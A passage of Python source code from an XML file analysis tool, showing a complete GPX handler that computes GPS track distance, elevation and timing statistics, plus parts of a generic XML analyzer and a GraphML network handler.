    def _extract_samples(self, root: ET.Element, max_samples: int = 5) -> List[Dict[str, Any]]:
        samples = []
        for i, elem in enumerate(root.iter()):
            if i >= max_samples:
                break
            if elem.text and elem.text.strip():
                samples.append({
                    'path': self._get_path(elem),
                    'tag': elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag,
                    'text': elem.text.strip()[:100],
                    'attributes': dict(elem.attrib)
                })
        return samples
    
    def _infer_schema(self, root: ET.Element) -> Dict[str, Any]:
        # Basic schema inference
        return {
            'probable_record_types': self._detect_patterns(root)['likely_records'],
            'hierarchical': self._calculate_depth(root) > 3
        }
    
    def _calculate_depth(self, elem: ET.Element, depth: int = 0) -> int:
        if not list(elem):
            return depth
        return max(self._calculate_depth(child, depth + 1) for child in elem)
    
    def _get_unique_paths(self, root: ET.Element) -> set:
        paths = set()
        
        def traverse(elem, path):
            current_path = f"{path}/{elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag}"
            paths.add(current_path)
            for child in elem:
                traverse(child, current_path)
        
        traverse(root, "")
        return paths
    
    def _get_path(self, elem: ET.Element) -> str:
        # Simple path extraction (would need more complex logic for full path)
        return elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
    
    def _analyze_quality(self, root: ET.Element) -> Dict[str, float]:
        total_elements = len(list(root.iter()))
        elements_with_text = sum(1 for e in root.iter() if e.text and e.text.strip())
        elements_with_attrs = sum(1 for e in root.iter() if e.attrib)
        
        return {
            "data_density": elements_with_text / total_elements if total_elements > 0 else 0,
            "attribute_usage": elements_with_attrs / total_elements if total_elements > 0 else 0,
            "structure_consistency": 0.7  # Would need more analysis
        }
</file>

<file path="src/handlers/gpx_handler.py">
#!/usr/bin/env python3
"""
GPX (GPS Exchange Format) Handler

Analyzes GPX files containing GPS tracking data, routes, and waypoints.
Supports GPX 1.0 and 1.1 formats with comprehensive track analysis,
elevation profiling, and fitness metrics calculation.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import math
import sys
import os
from datetime import datetime

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class GPXHandler(XMLHandler):
    """Handler for GPX GPS tracking files"""
    
    GPX_NAMESPACE_10 = "http://www.topografix.com/GPX/1/0"
    GPX_NAMESPACE_11 = "http://www.topografix.com/GPX/1/1"
    
    def _get_namespace(self, root: ET.Element) -> str:
        """Extract namespace prefix from root element"""
        if '}' in root.tag:
            return root.tag.split('}')[0] + '}'
        return ''
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for GPX namespace
        if any('topografix.com/GPX' in uri for uri in namespaces.values()):
            return True, 1.0
        
        # Check root element
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        if root_tag.lower() == 'gpx':
            # Check for GPX-specific elements
            ns = self._get_namespace(root)
            gpx_elements = ['wpt', 'rte', 'trk', 'trkpt', 'rtept']
            found = sum(1 for elem in gpx_elements if root.find(f'.//{ns}{elem}') is not None)
            if found >= 1:
                return True, min(found * 0.3, 0.9)
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Detect GPX version
        version = root.get('version', '1.1')
        
        # Detect GPX content type
        ns = self._get_namespace(root)
        content_type = "mixed"
        
        has_waypoints = root.find(f'.//{ns}wpt') is not None
        has_routes = root.find(f'.//{ns}rte') is not None
        has_tracks = root.find(f'.//{ns}trk') is not None
        
        if has_tracks and not has_waypoints and not has_routes:
            content_type = "track_log"
        elif has_routes and not has_tracks and not has_waypoints:
            content_type = "route_plan"
        elif has_waypoints and not has_tracks and not has_routes:
            content_type = "waypoint_collection"
        
        return DocumentTypeInfo(
            type_name="GPX GPS Data",
            confidence=0.95,
            version=version,
            metadata={
                "standard": "GPX (GPS Exchange Format)",
                "category": "gps_tracking",
                "content_type": content_type,
                "application": "GPS/Navigation"
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'metadata': self._analyze_metadata(root),
            'waypoints': self._analyze_waypoints(root),
            'routes': self._analyze_routes(root),
            'tracks': self._analyze_tracks(root),
            'statistics': self._calculate_statistics(root),
            'elevation_profile': self._analyze_elevation(root),
            'temporal_analysis': self._analyze_temporal_data(root),
            'geographic_bounds': self._calculate_bounds(root)
        }
        
        recommendations = [
            "Visualize GPS tracks on interactive maps",
            "Calculate fitness metrics and performance statistics",
            "Analyze elevation gain/loss and terrain difficulty",
            "Extract route planning and navigation data",
            "Compare tracks for performance improvement",
            "Generate heatmaps and activity patterns",
            "Export to other GPS formats (KML, GeoJSON)",
            "Validate GPS data quality and accuracy"
        ]
        
        ai_use_cases = [
            "Route optimization and path planning",
            "Activity recognition and classification",
            "Anomaly detection in GPS tracks",
            "Fitness performance analysis",
            "Terrain difficulty assessment",
            "Travel pattern recognition",
            "Location clustering and POI discovery",
            "Speed and pace analysis",
            "Elevation profile optimization",
            "GPS data quality assessment"
        ]
        
        return SpecializedAnalysis(
            document_type="GPX GPS Data",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={
                'waypoints': findings['waypoints']['count'],
                'routes': findings['routes']['count'],
                'tracks': findings['tracks']['count'],
                'track_points': findings['statistics']['total_points'],
                'time_span_hours': findings['temporal_analysis'].get('duration_hours', 0)
            },
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_data_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'track_data': self._extract_track_coordinates(root),
            'waypoint_data': self._extract_waypoint_data(root),
            'route_data': self._extract_route_data(root),
            'activity_summary': self._extract_activity_summary(root),
            'device_info': self._extract_device_info(root)
        }
    
    def _analyze_metadata(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze GPX metadata"""
        ns = self._get_namespace(root)
        metadata = {}
        
        # Basic metadata
        metadata_elem = root.find(f'{ns}metadata')
        if metadata_elem is not None:
            metadata.update({
                'name': self._get_element_text(metadata_elem, f'{ns}name'),
                'description': self._get_element_text(metadata_elem, f'{ns}desc'),
                'author': self._extract_author_info(metadata_elem, ns),
                'copyright': self._extract_copyright_info(metadata_elem, ns),
                'link': self._extract_link_info(metadata_elem, ns),
                'time': self._get_element_text(metadata_elem, f'{ns}time'),
                'keywords': self._get_element_text(metadata_elem, f'{ns}keywords')
            })
            
            # Bounds
            bounds_elem = metadata_elem.find(f'{ns}bounds')
            if bounds_elem is not None:
                metadata['bounds'] = {
                    'minlat': float(bounds_elem.get('minlat', 0)),
                    'minlon': float(bounds_elem.get('minlon', 0)),
                    'maxlat': float(bounds_elem.get('maxlat', 0)),
                    'maxlon': float(bounds_elem.get('maxlon', 0))
                }
        
        # Root-level metadata
        metadata.update({
            'version': root.get('version'),
            'creator': root.get('creator'),
            'xmlns': root.get('xmlns')
        })
        
        return metadata
    
    def _analyze_waypoints(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze waypoints"""
        ns = self._get_namespace(root)
        waypoints = {
            'count': 0,
            'points': [],
            'elevation_range': {'min': float('inf'), 'max': float('-inf')},
            'categories': {}
        }
        
        for wpt in root.findall(f'{ns}wpt')[:200]:  # Limit for performance
            waypoint = {
                'lat': float(wpt.get('lat', 0)),
                'lon': float(wpt.get('lon', 0)),
                'name': self._get_element_text(wpt, f'{ns}name'),
                'description': self._get_element_text(wpt, f'{ns}desc'),
                'elevation': self._get_element_float(wpt, f'{ns}ele'),
                'time': self._get_element_text(wpt, f'{ns}time'),
                'symbol': self._get_element_text(wpt, f'{ns}sym'),
                'type': self._get_element_text(wpt, f'{ns}type'),
                'comment': self._get_element_text(wpt, f'{ns}cmt')
            }
            
            # Track elevation range
            if waypoint['elevation'] is not None:
                waypoints['elevation_range']['min'] = min(waypoints['elevation_range']['min'], waypoint['elevation'])
                waypoints['elevation_range']['max'] = max(waypoints['elevation_range']['max'], waypoint['elevation'])
            
            # Categorize by type/symbol
            category = waypoint.get('type') or waypoint.get('symbol') or 'other'
            waypoints['categories'][category] = waypoints['categories'].get(category, 0) + 1
            
            waypoints['points'].append(waypoint)
        
        waypoints['count'] = len(waypoints['points'])
        
        # Handle case where no elevation data
        if waypoints['elevation_range']['min'] == float('inf'):
            waypoints['elevation_range'] = {'min': None, 'max': None}
        
        return waypoints
    
    def _analyze_routes(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze planned routes"""
        ns = self._get_namespace(root)
        routes = {
            'count': 0,
            'routes': []
        }
        
        for rte in root.findall(f'{ns}rte')[:50]:  # Limit for performance
            route = {
                'name': self._get_element_text(rte, f'{ns}name'),
                'description': self._get_element_text(rte, f'{ns}desc'),
                'comment': self._get_element_text(rte, f'{ns}cmt'),
                'source': self._get_element_text(rte, f'{ns}src'),
                'number': self._get_element_int(rte, f'{ns}number'),
                'type': self._get_element_text(rte, f'{ns}type'),
                'points': []
            }
            
            # Analyze route points
            for rtept in rte.findall(f'{ns}rtept')[:1000]:  # Limit points
                point = {
                    'lat': float(rtept.get('lat', 0)),
                    'lon': float(rtept.get('lon', 0)),
                    'elevation': self._get_element_float(rtept, f'{ns}ele'),
                    'name': self._get_element_text(rtept, f'{ns}name'),
                    'description': self._get_element_text(rtept, f'{ns}desc')
                }
                route['points'].append(point)
            
            route['point_count'] = len(route['points'])
            route['distance_km'] = self._calculate_distance(route['points']) if route['points'] else 0
            
            routes['routes'].append(route)
        
        routes['count'] = len(routes['routes'])
        return routes
    
    def _analyze_tracks(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze GPS tracks"""
        ns = self._get_namespace(root)
        tracks = {
            'count': 0,
            'tracks': []
        }
        
        for trk in root.findall(f'{ns}trk')[:50]:  # Limit for performance
            track = {
                'name': self._get_element_text(trk, f'{ns}name'),
                'description': self._get_element_text(trk, f'{ns}desc'),
                'comment': self._get_element_text(trk, f'{ns}cmt'),
                'source': self._get_element_text(trk, f'{ns}src'),
                'number': self._get_element_int(trk, f'{ns}number'),
                'type': self._get_element_text(trk, f'{ns}type'),
                'segments': []
            }
            
            # Analyze track segments
            for trkseg in trk.findall(f'{ns}trkseg'):
                segment = {
                    'points': []
                }
                
                for trkpt in trkseg.findall(f'{ns}trkpt')[:5000]:  # Limit points per segment
                    point = {
                        'lat': float(trkpt.get('lat', 0)),
                        'lon': float(trkpt.get('lon', 0)),
                        'elevation': self._get_element_float(trkpt, f'{ns}ele'),
                        'time': self._get_element_text(trkpt, f'{ns}time'),
                        'speed': self._get_element_float(trkpt, f'{ns}speed'),
                        'course': self._get_element_float(trkpt, f'{ns}course'),
                        'hdop': self._get_element_float(trkpt, f'{ns}hdop'),
                        'vdop': self._get_element_float(trkpt, f'{ns}vdop'),
                        'pdop': self._get_element_float(trkpt, f'{ns}pdop')
                    }
                    segment['points'].append(point)
                
                segment['point_count'] = len(segment['points'])
                segment['distance_km'] = self._calculate_distance(segment['points']) if segment['points'] else 0
                segment['duration_minutes'] = self._calculate_duration(segment['points']) if segment['points'] else 0
                
                track['segments'].append(segment)
            
            track['total_points'] = sum(seg['point_count'] for seg in track['segments'])
            track['total_distance_km'] = sum(seg['distance_km'] for seg in track['segments'])
            track['total_duration_minutes'] = sum(seg['duration_minutes'] for seg in track['segments'])
            
            tracks['tracks'].append(track)
        
        tracks['count'] = len(tracks['tracks'])
        return tracks
    
    def _calculate_statistics(self, root: ET.Element) -> Dict[str, Any]:
        """Calculate comprehensive GPS statistics"""
        ns = self._get_namespace(root)
        stats = {
            'total_points': 0,
            'total_distance_km': 0.0,
            'total_duration_hours': 0.0,
            'max_speed_kmh': 0.0,
            'avg_speed_kmh': 0.0,
            'elevation_gain_m': 0.0,
            'elevation_loss_m': 0.0,
            'max_elevation_m': float('-inf'),
            'min_elevation_m': float('inf')
        }
        
        all_points = []
        
        # Collect all track points
        for trk in root.findall(f'{ns}trk'):
            for trkseg in trk.findall(f'{ns}trkseg'):
                for trkpt in trkseg.findall(f'{ns}trkpt'):
                    point_data = {
                        'lat': float(trkpt.get('lat', 0)),
                        'lon': float(trkpt.get('lon', 0)),
                        'elevation': self._get_element_float(trkpt, f'{ns}ele'),
                        'time': self._get_element_text(trkpt, f'{ns}time'),
                        'speed': self._get_element_float(trkpt, f'{ns}speed')
                    }
                    all_points.append(point_data)
        
        if not all_points:
            return stats
        
        stats['total_points'] = len(all_points)
        stats['total_distance_km'] = self._calculate_distance(all_points)
        stats['total_duration_hours'] = self._calculate_duration(all_points) / 60.0  # Convert to hours
        
        # Speed analysis
        speeds = [p['speed'] for p in all_points if p['speed'] is not None]
        if speeds:
            stats['max_speed_kmh'] = max(speeds) * 3.6  # Convert m/s to km/h
        
        if stats['total_duration_hours'] > 0:
            stats['avg_speed_kmh'] = stats['total_distance_km'] / stats['total_duration_hours']
        
        # Elevation analysis
        elevations = [p['elevation'] for p in all_points if p['elevation'] is not None]
        if elevations:
            stats['max_elevation_m'] = max(elevations)
            stats['min_elevation_m'] = min(elevations)
            
            # Calculate elevation gain/loss
            gain, loss = self._calculate_elevation_change(elevations)
            stats['elevation_gain_m'] = gain
            stats['elevation_loss_m'] = loss
        else:
            stats['max_elevation_m'] = None
            stats['min_elevation_m'] = None
        
        return stats
    
    def _analyze_elevation(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze elevation profile"""
        ns = self._get_namespace(root)
        elevation_data = {
            'has_elevation': False,
            'profile_points': [],
            'statistics': {},
            'gradient_analysis': {}
        }
        
        # Collect elevation points from tracks
        all_points = []
        for trk in root.findall(f'{ns}trk'):
            for trkseg in trk.findall(f'{ns}trkseg'):
                for trkpt in trkseg.findall(f'{ns}trkpt'):
                    elevation = self._get_element_float(trkpt, f'{ns}ele')
                    if elevation is not None:
                        all_points.append({
                            'lat': float(trkpt.get('lat', 0)),
                            'lon': float(trkpt.get('lon', 0)),
                            'elevation': elevation,
                            'distance': 0  # Will be calculated
                        })
        
        if not all_points:
            return elevation_data
        
        elevation_data['has_elevation'] = True
        
        # Calculate distances
        cumulative_distance = 0
        for i, point in enumerate(all_points):
            if i > 0:
                dist = self._haversine_distance(
                    all_points[i-1]['lat'], all_points[i-1]['lon'],
                    point['lat'], point['lon']
                )
                cumulative_distance += dist
            point['distance'] = cumulative_distance
        
        # Sample points for profile (reduce density for large tracks)
        sample_rate = max(1, len(all_points) // 500)  # Max 500 points
        elevation_data['profile_points'] = all_points[::sample_rate]
        
        # Calculate statistics
        elevations = [p['elevation'] for p in all_points]
        if elevations:
            elevation_data['statistics'] = {
                'min': min(elevations),
                'max': max(elevations),
                'range': max(elevations) - min(elevations),
                'mean': sum(elevations) / len(elevations),
                'gain': 0,
                'loss': 0
            }
            
            # Calculate gain/loss
            gain, loss = self._calculate_elevation_change(elevations)
            elevation_data['statistics']['gain'] = gain
            elevation_data['statistics']['loss'] = loss
        
        # Gradient analysis
        if len(all_points) > 1:
            gradients = []
            for i in range(1, len(all_points)):
                distance_diff = all_points[i]['distance'] - all_points[i-1]['distance']
                elevation_diff = all_points[i]['elevation'] - all_points[i-1]['elevation']
                if distance_diff > 0:
                    gradient = (elevation_diff / (distance_diff * 1000)) * 100  # Percentage
                    gradients.append(gradient)
            
            if gradients:
                elevation_data['gradient_analysis'] = {
                    'max_gradient': max(gradients),
                    'min_gradient': min(gradients),
                    'avg_gradient': sum(gradients) / len(gradients),
                    'steep_sections': len([g for g in gradients if abs(g) > 10])  # >10% grade
                }
        
        return elevation_data
    
    def _analyze_temporal_data(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze temporal aspects of GPS data"""
        ns = self._get_namespace(root)
        temporal = {
            'has_timestamps': False,
            'start_time': None,
            'end_time': None,
            'duration_hours': 0,
            'time_gaps': [],
            'activity_periods': []
        }
        
        # Collect timestamps from tracks
        timestamps = []
        for trk in root.findall(f'{ns}trk'):
            for trkseg in trk.findall(f'{ns}trkseg'):
                for trkpt in trkseg.findall(f'{ns}trkpt'):
                    time_str = self._get_element_text(trkpt, f'{ns}time')
                    if time_str:
                        try:
                            # Parse ISO format timestamp
                            timestamp = datetime.fromisoformat(time_str.replace('Z', '+00:00'))
                            timestamps.append(timestamp)
                        except ValueError:
                            continue
        
        if not timestamps:
            return temporal
        
        temporal['has_timestamps'] = True
        timestamps.sort()
        
        temporal['start_time'] = timestamps[0].isoformat()
        temporal['end_time'] = timestamps[-1].isoformat()
        temporal['duration_hours'] = (timestamps[-1] - timestamps[0]).total_seconds() / 3600
        
        # Detect time gaps (>5 minutes between points)
        gaps = []
        for i in range(1, len(timestamps)):
            gap_seconds = (timestamps[i] - timestamps[i-1]).total_seconds()
            if gap_seconds > 300:  # 5 minutes
                gaps.append({
                    'start': timestamps[i-1].isoformat(),
                    'end': timestamps[i].isoformat(),
                    'duration_minutes': gap_seconds / 60
                })
        
        temporal['time_gaps'] = gaps[:20]  # Limit
        
        return temporal
    
    def _calculate_bounds(self, root: ET.Element) -> Dict[str, float]:
        """Calculate geographic bounds"""
        ns = self._get_namespace(root)
        bounds = {
            'north': -90.0,
            'south': 90.0,
            'east': -180.0,
            'west': 180.0
        }
        
        found_points = False
        
        # Check all points (waypoints, route points, track points)
        for element_type in ['wpt', 'rtept', 'trkpt']:
            for point in root.findall(f'.//{ns}{element_type}'):
                lat = float(point.get('lat', 0))
                lon = float(point.get('lon', 0))
                
                bounds['north'] = max(bounds['north'], lat)
                bounds['south'] = min(bounds['south'], lat)
                bounds['east'] = max(bounds['east'], lon)
                bounds['west'] = min(bounds['west'], lon)
                found_points = True
        
        if not found_points:
            return {'north': 0, 'south': 0, 'east': 0, 'west': 0}
        
        return bounds
    
    def _extract_track_coordinates(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract track coordinates for analysis"""
        ns = self._get_namespace(root)
        tracks = []
        
        for trk in root.findall(f'{ns}trk')[:10]:  # Limit tracks
            track_data = {
                'name': self._get_element_text(trk, f'{ns}name'),
                'segments': []
            }
            
            for trkseg in trk.findall(f'{ns}trkseg'):
                segment_points = []
                for trkpt in trkseg.findall(f'{ns}trkpt')[:1000]:  # Limit points
                    point = {
                        'lat': float(trkpt.get('lat', 0)),
                        'lon': float(trkpt.get('lon', 0)),
                        'elevation': self._get_element_float(trkpt, f'{ns}ele'),
                        'time': self._get_element_text(trkpt, f'{ns}time')
                    }
                    segment_points.append(point)
                
                if segment_points:
                    track_data['segments'].append(segment_points)
            
            if track_data['segments']:
                tracks.append(track_data)
        
        return tracks
    
    def _extract_waypoint_data(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract waypoint data"""
        ns = self._get_namespace(root)
        waypoints = []
        
        for wpt in root.findall(f'{ns}wpt')[:100]:  # Limit waypoints
            waypoint = {
                'lat': float(wpt.get('lat', 0)),
                'lon': float(wpt.get('lon', 0)),
                'name': self._get_element_text(wpt, f'{ns}name'),
                'description': self._get_element_text(wpt, f'{ns}desc'),
                'elevation': self._get_element_float(wpt, f'{ns}ele'),
                'symbol': self._get_element_text(wpt, f'{ns}sym'),
                'type': self._get_element_text(wpt, f'{ns}type')
            }
            waypoints.append(waypoint)
        
        return waypoints
    
    def _extract_route_data(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract route data"""
        ns = self._get_namespace(root)
        routes = []
        
        for rte in root.findall(f'{ns}rte')[:10]:  # Limit routes
            route_points = []
            for rtept in rte.findall(f'{ns}rtept')[:500]:  # Limit points
                point = {
                    'lat': float(rtept.get('lat', 0)),
                    'lon': float(rtept.get('lon', 0)),
                    'elevation': self._get_element_float(rtept, f'{ns}ele'),
                    'name': self._get_element_text(rtept, f'{ns}name')
                }
                route_points.append(point)
            
            if route_points:
                route = {
                    'name': self._get_element_text(rte, f'{ns}name'),
                    'points': route_points
                }
                routes.append(route)
        
        return routes
    
    def _extract_activity_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract activity summary"""
        metadata = self._analyze_metadata(root)
        stats = self._calculate_statistics(root)
        
        return {
            'activity_name': metadata.get('name'),
            'activity_type': 'GPS Track',
            'total_distance_km': stats['total_distance_km'],
            'total_duration_hours': stats['total_duration_hours'],
            'average_speed_kmh': stats['avg_speed_kmh'],
            'elevation_gain_m': stats['elevation_gain_m'],
            'creator': metadata.get('creator')
        }
    
    def _extract_device_info(self, root: ET.Element) -> Dict[str, Any]:
        """Extract device and software information"""
        return {
            'creator': root.get('creator'),
            'version': root.get('version'),
            'namespace': self._get_namespace(root).strip('{}')
        }
    
    def _assess_data_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess GPX data quality"""
        metrics = {
            'completeness': 0.0,
            'temporal_consistency': 0.0,
            'spatial_accuracy': 0.0,
            'metadata_richness': 0.0,
            'overall': 0.0
        }
        
        # Completeness (based on elevation and time data)
        stats = findings['statistics']
        elevation_data = findings['elevation_profile']
        temporal_data = findings['temporal_analysis']
        
        completeness_factors = []
        if elevation_data['has_elevation']:
            completeness_factors.append(1.0)
        else:
            completeness_factors.append(0.3)
        
        if temporal_data['has_timestamps']:
            completeness_factors.append(1.0)
        else:
            completeness_factors.append(0.3)
        
        if stats['total_points'] > 100:
            completeness_factors.append(1.0)
        elif stats['total_points'] > 10:
            completeness_factors.append(0.7)
        else:
            completeness_factors.append(0.3)
        
        metrics['completeness'] = sum(completeness_factors) / len(completeness_factors)
        
        # Temporal consistency
        if temporal_data['has_timestamps']:
            gap_penalty = min(len(temporal_data['time_gaps']) * 0.1, 0.5)
            metrics['temporal_consistency'] = max(0.5, 1.0 - gap_penalty)
        else:
            metrics['temporal_consistency'] = 0.3
        
        # Spatial accuracy (rough estimate based on point density)
        if stats['total_distance_km'] > 0 and stats['total_points'] > 0:
            points_per_km = stats['total_points'] / stats['total_distance_km']
            if points_per_km > 100:  # Very dense
                metrics['spatial_accuracy'] = 1.0
            elif points_per_km > 20:  # Good density
                metrics['spatial_accuracy'] = 0.8
            elif points_per_km > 5:   # Reasonable density
                metrics['spatial_accuracy'] = 0.6
            else:  # Sparse
                metrics['spatial_accuracy'] = 0.4
        else:
            metrics['spatial_accuracy'] = 0.5
        
        # Metadata richness
        metadata = findings['metadata']
        richness_score = 0
        if metadata.get('name'):
            richness_score += 0.25
        if metadata.get('description'):
            richness_score += 0.25
        if metadata.get('creator'):
            richness_score += 0.25
        if metadata.get('bounds'):
            richness_score += 0.25
        
        metrics['metadata_richness'] = richness_score
        
        # Overall
        metrics['overall'] = (
            metrics['completeness'] * 0.3 +
            metrics['temporal_consistency'] * 0.25 +
            metrics['spatial_accuracy'] * 0.25 +
            metrics['metadata_richness'] * 0.2
        )
        
        return metrics
    
    # Utility methods
    def _extract_author_info(self, metadata_elem: ET.Element, ns: str) -> Optional[Dict[str, str]]:
        """Extract author information"""
        author_elem = metadata_elem.find(f'{ns}author')
        if author_elem is not None:
            return {
                'name': self._get_element_text(author_elem, f'{ns}name'),
                'email': self._get_element_text(author_elem, f'{ns}email')
            }
        return None
    
    def _extract_copyright_info(self, metadata_elem: ET.Element, ns: str) -> Optional[Dict[str, str]]:
        """Extract copyright information"""
        copyright_elem = metadata_elem.find(f'{ns}copyright')
        if copyright_elem is not None:
            return {
                'author': copyright_elem.get('author'),
                'year': self._get_element_text(copyright_elem, f'{ns}year'),
                'license': self._get_element_text(copyright_elem, f'{ns}license')
            }
        return None
    
    def _extract_link_info(self, metadata_elem: ET.Element, ns: str) -> Optional[Dict[str, str]]:
        """Extract link information"""
        link_elem = metadata_elem.find(f'{ns}link')
        if link_elem is not None:
            return {
                'href': link_elem.get('href'),
                'text': self._get_element_text(link_elem, f'{ns}text'),
                'type': self._get_element_text(link_elem, f'{ns}type')
            }
        return None
    
    def _calculate_distance(self, points: List[Dict[str, Any]]) -> float:
        """Calculate total distance in kilometers"""
        if len(points) < 2:
            return 0.0
        
        total_distance = 0.0
        for i in range(1, len(points)):
            dist = self._haversine_distance(
                points[i-1]['lat'], points[i-1]['lon'],
                points[i]['lat'], points[i]['lon']
            )
            total_distance += dist
        
        return total_distance
    
    def _calculate_duration(self, points: List[Dict[str, Any]]) -> float:
        """Calculate duration in minutes"""
        timestamps = [p.get('time') for p in points if p.get('time')]
        if len(timestamps) < 2:
            return 0.0
        
        try:
            start = datetime.fromisoformat(timestamps[0].replace('Z', '+00:00'))
            end = datetime.fromisoformat(timestamps[-1].replace('Z', '+00:00'))
            return (end - start).total_seconds() / 60.0
        except (ValueError, IndexError):
            return 0.0
    
    def _calculate_elevation_change(self, elevations: List[float]) -> Tuple[float, float]:
        """Calculate elevation gain and loss"""
        if len(elevations) < 2:
            return 0.0, 0.0
        
        gain = 0.0
        loss = 0.0
        
        for i in range(1, len(elevations)):
            diff = elevations[i] - elevations[i-1]
            if diff > 0:
                gain += diff
            else:
                loss += abs(diff)
        
        return gain, loss
    
    def _haversine_distance(self, lat1: float, lon1: float, lat2: float, lon2: float) -> float:
        """Calculate distance between two points using Haversine formula (km)"""
        R = 6371.0  # Earth radius in kilometers
        
        lat1_rad = math.radians(lat1)
        lon1_rad = math.radians(lon1)
        lat2_rad = math.radians(lat2)
        lon2_rad = math.radians(lon2)
        
        dlat = lat2_rad - lat1_rad
        dlon = lon2_rad - lon1_rad
        
        a = math.sin(dlat/2)**2 + math.cos(lat1_rad) * math.cos(lat2_rad) * math.sin(dlon/2)**2
        c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
        
        return R * c
    
    def _get_element_text(self, parent: ET.Element, path: str) -> Optional[str]:
        """Safely get element text"""
        elem = parent.find(path)
        if elem is not None and elem.text:
            return elem.text.strip()
        return None
    
    def _get_element_float(self, parent: ET.Element, path: str) -> Optional[float]:
        """Safely get element as float"""
        text = self._get_element_text(parent, path)
        if text:
            try:
                return float(text)
            except ValueError:
                pass
        return None
    
    def _get_element_int(self, parent: ET.Element, path: str) -> Optional[int]:
        """Safely get element as int"""
        text = self._get_element_text(parent, path)
        if text:
            try:
                return int(text)
            except ValueError:
                pass
        return None
</file>

<file path="src/handlers/graphml_handler.py">
#!/usr/bin/env python3
"""
GraphML Handler

Analyzes GraphML (Graph Markup Language) files which describe graphs, networks,
and their associated data. Extracts nodes, edges, graph structure, attributes,
and performs network analysis for visualization and graph algorithms.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os
import math

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class GraphMLHandler(XMLHandler):
    """Handler for GraphML (Graph Markup Language) files"""
    
    GRAPHML_NAMESPACE = "http://graphml.graphdrawing.org/xmlns"
    GRAPHML_NAMESPACES = [
        "graphml.graphdrawing.org",
        "graphdrawing.org/xmlns"
    ]
    
    def _get_namespace(self, root: ET.Element) -> str:
        """Extract namespace prefix from root element"""
        if '}' in root.tag:
            return root.tag.split('}')[0] + '}'
        return ''
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for GraphML namespace
        for uri in namespaces.values():
            if any(ns in uri for ns in self.GRAPHML_NAMESPACES):
                return True, 1.0
        
        # Check root element
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        if root_tag.lower() == 'graphml':
            return True, 0.95
        
        # Check for GraphML-specific elements
        ns = self._get_namespace(root)
        graphml_elements = ['graph', 'node', 'edge', 'key', 'data']
        found_elements = sum(1 for elem in graphml_elements 
                           if root.find(f'.//{ns}{elem}') is not None)
        
        if found_elements >= 3:
            return True, min(found_elements * 0.2, 0.9)
        
        # Check for graph with nodes and edges
        graph = root.find('.//graph')
        if graph is not None:
            nodes = len(graph.findall('.//node'))
            edges = len(graph.findall('.//edge'))
            if nodes > 0 and edges > 0:
                return True, 0.8
            elif nodes > 0:
                return True, 0.6
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Detect GraphML version
        version = "1.0"  # Default
        if 'version' in root.attrib:
            version = root.get('version', '1.0')
        
        # Detect graph characteristics
        ns = self._get_namespace(root)
        graph_type = "generic"
        
        # Analyze graph structure
        graphs = root.findall(f'.//{ns}graph')
        if graphs:
            graph = graphs[0]  # Analyze first graph
            
            # Check if directed
            is_directed = graph.get('edgedefault', 'undirected') == 'directed'
            
            # Count nodes and edges
            node_count = len(graph.findall(f'{ns}node'))
            edge_count = len(graph.findall(f'{ns}edge'))
            
            # Determine graph type based on structure
            if node_count > 0 and edge_count > 0:
                edge_node_ratio = edge_count / node_count
                
                if edge_node_ratio > 3:
                    graph_type = "dense_network"
                elif edge_node_ratio < 0.5:
                    graph_type = "sparse_network"
                elif is_directed:
                    graph_type = "directed_graph"
                else:
                    graph_type = "undirected_graph"
            elif node_count > 0:
                graph_type = "node_only"
            
            # Check for specific patterns
            if any('tree' in str(data.text).lower() for data in root.findall('.//data') if data.text):
                graph_type = "tree_structure"
            elif any('social' in str(data.text).lower() for data in root.findall('.//data') if data.text):
                graph_type = "social_network"
            elif any('neural' in str(data.text).lower() for data in root.findall('.//data') if data.text):
                graph_type = "neural_network"
        
        # Determine complexity
        total_elements = len(root.findall('.//node')) + len(root.findall('.//edge'))
        complexity = "simple" if total_elements < 50 else "medium" if total_elements < 500 else "complex"
        
        return DocumentTypeInfo(
            type_name="GraphML Network",
            confidence=0.95,
            version=version,
            metadata={
                "standard": "GraphML",
                "category": "network_data",
                "graph_type": graph_type,
                "complexity": complexity,
                "node_count": len(root.findall('.//node')),
                "edge_count": len(root.findall('.//edge'))
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'file_info': self._analyze_file_info(root),
            'graph_structure': self._analyze_graph_structure(root),
            'nodes': self._analyze_nodes(root),
